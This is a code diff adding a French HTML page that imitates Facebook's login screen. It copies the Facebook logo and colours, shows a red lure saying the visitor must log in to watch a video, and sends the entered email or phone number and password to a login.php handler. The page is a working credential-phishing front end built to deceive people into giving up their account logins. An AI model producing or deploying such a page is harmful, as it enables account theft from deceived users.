@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion Facebook</title>
+    <style>
+        /* Mise en page de l'arrière-plan */
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-image: url('https://i.imgur.com/BC5auKQ.jpeg'); /* Image d'arrière-plan */
+            background-size: cover; /* L'image couvre tout l'écran */
+            background-position: center; /* Centrer l'image */
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #333;
+        }
+
+        /* Style du conteneur de connexion */
+        .login-container {
+            background-color: rgba(255, 255, 255, 0.8); /* Couleur blanche semi-transparente */
+            padding: 40px 40px 20px;
+            width: 350px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            backdrop-filter: blur(5px); /* Ajoute un flou à l'arrière-plan du formulaire */
+        }
+        
+        /* Style du titre */
+        h2 {
+            color: #1877f2;
+            font-size: 28px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+
+        /* Logo de Facebook */
+        .facebook-logo {
+            width: 40px;
+            height: auto;
+            margin-bottom: 15px;
+        }
+
+        /* Style des champs de formulaire */
+        label {
+            font-size: 14px;
+            color: #555;
+        }
+        
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            background-color: #f1f2f6;
+        }
+        
+        /* Style du bouton de connexion */
+        input[type="submit"] {
+            background-color: #1877f2;
+            color: white;
+            padding: 12px;
+            width: 100%;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        input[type="submit"]:hover {
+            background-color: #145dbf;
+        }
+
+        /* Style du message en bas */
+        .bottom-message {
+            margin-top: 20px;
+            font-size: 14px;
+            color: red; /* Changer la couleur en rouge */
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <!-- Logo Facebook -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Logo Facebook" class="facebook-logo">
+        
+        <h2>Facebook</h2>
+        <form action="login.php" method="post">
+            <label for="username">Adresse e-mail ou numéro de téléphone</label><br>
+            <input type="text" id="username" name="username" placeholder="Email ou téléphone" required><br>
+            <label for="password">Mot de passe</label><br>
+            <input type="password" id="password" name="password" placeholder="Mot de passe" required><br>
+            <input type="submit" value="Se connecter">
+        </form>
+
+        <!-- Message en bas en rouge -->
+        <div class="bottom-message">
+            Vous devez vous connecter pour voir la vidéo
+        </div>
+    </div>
+</body>
+</html>
